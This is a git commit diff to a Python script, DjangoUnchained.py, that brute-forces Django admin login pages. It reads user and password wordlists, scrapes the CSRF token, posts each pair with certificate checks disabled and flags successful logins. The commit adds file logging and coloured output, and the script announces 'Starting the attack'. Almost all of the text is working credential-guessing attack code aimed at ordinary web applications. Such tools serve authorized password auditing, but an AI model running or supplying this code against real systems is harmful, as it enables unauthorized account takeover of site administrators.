44fe52098724893cc3973ffc1f393513943920c9
n3bojs4 <n3bojs4@gmail.com>
2023-01-28 00:28:39 +0100

    add logging + colors

--- DjangoUnchained.py
+++ DjangoUnchained.py
@@ -4,10 +4,13 @@ from operator import eq
 import urllib3
 import argparse
 from bs4 import BeautifulSoup
+import logging
+import sys
+from colorama import Back, Fore, Style
 
 
 def banner():
-    print("""
+    print(Fore.GREEN, Style.BRIGHT,"""
 ---------------------------------------------------
   ____  _                                         
  |  _ \(_) __ _ _ __   __ _  ___                  
@@ -24,7 +27,7 @@ def banner():
 ----------------------------------------------------                                                  
 
 Django Admin Panel password testing tool v0.1 - by n3bojs4   
-    """)
+    """,Style.RESET_ALL)
 
 
 
@@ -37,6 +40,7 @@ parser.add_argument("-uri",help="uri for the admin login page, \"/admin/login/\"
 parser.add_argument("-userdict",help="dictionnary file for user list.",required=True)
 parser.add_argument("-passwdict",help="dictionnary file for password.",required=True)
 parser.add_argument("-onlygood",help="Show only good attempts.",action='store_true', default=False, required=False)
+parser.add_argument("-l",help="Log to a file.",required=False)
 
 # Show banner
 banner()
@@ -50,6 +54,7 @@ uri = args.uri
 userdict = args.userdict
 passwords = args.passwdict
 onlygood = args.onlygood
+logfile = args.l
 
 admin_url = scheme + '://' + domain + uri
 
@@ -57,8 +62,21 @@ admin_url = scheme + '://' + domain + uri
 # Disable warnings for certs
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# By default it ignores certs
+# By default certs are ignored
 http = urllib3.PoolManager(cert_reqs='CERT_NONE')
+
+# initiate logger if logging is on
+if logfile:
+    logger = logging.getLogger()
+    try:
+        LOGFILE = logging.FileHandler(logfile)
+    except:
+        print("cannot open logfile:",logfile)
+        exit(1)
+    formatter = logging.Formatter('%(asctime)s - %(message)s')
+    LOGFILE.setFormatter(formatter)
+    logger.addHandler(LOGFILE)
+
 
 
 # Opening dict files
@@ -81,6 +99,7 @@ headers={'Connection': 'keep-alive',
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
             'Referer': domain + uri }
 
+# Functions
 
 def Authenticate(admin_url,username,password):
     r = http.request('GET', admin_url, headers=headers)
@@ -90,7 +109,7 @@ def Authenticate(admin_url,username,password):
 
     # Getting the csrf token
     csrfmiddlewaretoken = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
-    
+
     # Getting next page
     nextpage = soup.find('input', {'name': 'next'})['value']
     
@@ -103,20 +122,36 @@ def Authenticate(admin_url,username,password):
     data = postlogin.data.decode('utf-8')
 
     if "CSRF" in data:
-        print("CSRF token missing or invalid !")
+        msg = "CSRF token missing or invalid !"
+        print(msg)
+        if logfile:
+            logger.warning(msg)
     if "Please" in data and onlygood is False:
-        print("Trying username:",username, "password:",password, "FAILED")
+        msg = "Trying username:" + username + " password:" + password + " FAILED"
+        print(msg)
+        if logfile:
+            logger.warning(msg)
     if postlogin.status == 302 :
         if "sessionid" in postlogin.headers["Set-Cookie"]:
-            print("Found a valid account !!! --> username:", username, "pass:",password)
+            msg = "SUCCESS: Found a valid account !!! --> username:" + username + " pass:" + password
+            print(Back.YELLOW+Fore.RED+Style.BRIGHT+msg+Style.RESET_ALL)
+            if logfile:
+                logger.warning(msg)
         else:
-            print("It seems we found a valid account --> username:", username, "pass:",password,"but no sessionid cookie has been set, check manually !")
+            msg = "SUCCESS: It seems we found a valid account --> username:" + username + " pass:" + password + " but no sessionid cookie has been set, check manually !"
+            print(Back.YELLOW+Fore.RED+Style.BRIGHT+msg+Style.RESET_ALL)
+            if logfile:
+                logger.warning(msg)
     
+
+
+# Main
+
 
 userlist = list(set([(word.strip()) for word in USERS.readlines()]))
 passwordlist = list(set([(word.strip()) for word in PASSWORDS.readlines()]))
 
-
+print("Starting the attack against",admin_url,"...")
 
 for user in userlist:
     for password in passwordlist:
